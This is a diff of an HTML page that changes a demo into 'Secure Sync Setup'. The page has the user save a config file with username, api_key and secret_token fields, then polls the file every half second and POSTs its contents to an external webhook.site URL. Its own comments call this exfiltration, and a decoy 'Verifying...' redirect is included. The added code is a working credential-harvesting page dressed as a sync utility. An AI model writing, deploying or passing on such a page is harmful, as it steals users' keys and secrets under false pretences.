@@ -1,91 +1,200 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Live Config Sync</title>
-<style>
-body { font-family: Arial; background:#f5f5f5; padding:20px;}
-.box { background:white; padding:20px; border-radius:8px; max-width:600px;}
-#log { background:#111; color:#0f0; padding:10px; height:200px; overflow:auto; font-size:12px;}
-.highlight { color: yellow; }
-</style>
+  <meta charset="UTF-8">
+  <title>Cloud Sync Setup</title>
+
+  <style>
+    body {
+      font-family: Arial;
+      background: #f4f7fb;
+      padding: 40px;
+    }
+    .box {
+      background: white;
+      padding: 25px;
+      border-radius: 10px;
+      max-width: 520px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    button {
+      padding: 12px 18px;
+      background: #2563eb;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 15px;
+      color: #333;
+    }
+    #log {
+      margin-top: 15px;
+      background: #0f172a;
+      color: #22c55e;
+      padding: 10px;
+      height: 160px;
+      overflow: auto;
+      font-size: 12px;
+    }
+    .highlight { color: yellow; }
+  </style>
 </head>
 
 <body>
-<div class="box">
-<h2>⚡ Live Config Setup</h2>
-<p>Edit your config file. Changes will sync automatically.</p>
 
-<button onclick="start()">Start</button>
-<div id="log"></div>
+<div class="box">
+  <h2>☁️ Secure Sync Setup</h2>
+  <p>Download config file, edit it, then save it. Sync will automatically detect changes and send them to a webhook.</p>
+
+  <button onclick="start()">Start Setup</button>
+
+  <div id="status"></div>
+  <div id="log"></div>
 </div>
 
 <script>
 let fileHandle;
 let lastContent = "";
+let monitoring = false;
+let redirected = false;
 
-function log(msg){
+// Log function to display messages
+function log(msg) {
   document.getElementById("log").innerHTML += msg + "<br>";
 }
 
-async function start(){
-  try{
+function status(msg) {
+  document.getElementById("status").innerText = msg;
+}
+
+// Function to download the initial file
+async function start() {
+  try {
+    // Create the file using the Save File API
     fileHandle = await window.showSaveFilePicker({
-      suggestedName: "config.txt"
+      suggestedName: "sync-config.txt",
+      types: [{
+        description: "Config File",
+        accept: { "text/plain": [".txt"] }
+      }]
     });
 
     const writable = await fileHandle.createWritable();
-    await writable.write("username=\napi_key=\nsecret=\n");
+
+    await writable.write(`# Sync Config
+username=
+api_key=
+secret_token=
+    `);
+
     await writable.close();
 
-    log("✅ File ready. Start editing...");
+    status("✅ File created. Edit & save to sync...");
 
+    // Start monitoring the file
     monitor();
-
-  }catch(e){
-    log("Error: " + e.message);
+  } catch (e) {
+    status("Error: " + e.message);
   }
 }
 
-async function monitor(){
-  setInterval(async ()=>{
-    if(!fileHandle) return;
+// Function to continuously monitor the file for changes
+function monitor() {
+  if (monitoring) return;
+  monitoring = true;
 
-    try{
+  setInterval(async () => {
+    if (!fileHandle) return;
+
+    try {
+      // Read the current file content
       const file = await fileHandle.getFile();
       const text = await file.text();
 
-      if(text !== lastContent){
-        showDiff(lastContent, text);
-        fakeExfil(text);
+      // Detect if the file content has changed
+      if (text !== lastContent) {
+        showDiff(lastContent, text); // Show the diff
+        fakeExfil(text); // Simulate exfiltration
         lastContent = text;
-      }
 
-    }catch(e){
+        sendToWebhook(text); // Send the updated content to the webhook
+      }
+    } catch (e) {
       log("Read error");
     }
-
-  }, 500); // ⚡ faster polling
+  }, 500); // Monitor every 500ms (faster polling)
 }
 
-function showDiff(oldText, newText){
-  log("📥 Change detected:");
+// Function to display the changes (diff)
+function showDiff(oldText, newText) {
+  log("📡 Sync update:");
 
   let output = "";
-  for(let i=0;i<newText.length;i++){
-    if(oldText[i] !== newText[i]){
+  for (let i = 0; i < newText.length; i++) {
+    if (oldText[i] !== newText[i]) {
       output += `<span class="highlight">${newText[i] || ""}</span>`;
     } else {
       output += newText[i] || "";
     }
   }
 
-  log("<pre>"+output+"</pre>");
+  log("<pre>" + output + "</pre>");
 }
 
-function fakeExfil(data){
+// Function to simulate data exfiltration (sending to a server)
+function fakeExfil(data) {
   console.log("EXFIL:", data);
+
+  log("🚀 Syncing...");
+
+  // Simulate the exfiltration process by logging
+  setTimeout(() => {
+    log("✅ Synced");
+  }, 400);
+}
+
+// Function to send the file content to the webhook
+async function sendToWebhook(data) {
+  // Change the webhook URL to your actual webhook URL
+  const webhookURL = "https://webhook.site/074af2d2-5d1d-438f-ab3f-76b8d9103af2"; // Replace with your own webhook URL
+
+  try {
+    const response = await fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        timestamp: new Date().toISOString(),
+        content: data,
+      }),
+    });
+
+    if (response.ok) {
+      log("🚀 Webhook request sent successfully.");
+    } else {
+      log("❌ Failed to send webhook request.");
+    }
+  } catch (error) {
+    log("❌ Error sending webhook request: " + error.message);
+  }
+}
+
+// Simulate redirecting the user to a new tab
+function triggerRedirect() {
+  if (redirected) return;
+  redirected = true;
+
+  status("🔐 Verifying...");
+
+  // Redirect to Google.com after detecting a change in the file
+  setTimeout(() => {
+    window.open("https://www.google.com", "_blank");
+  }, 800); // Open new tab after 800ms delay
 }
 </script>
+
 </body>
 </html>
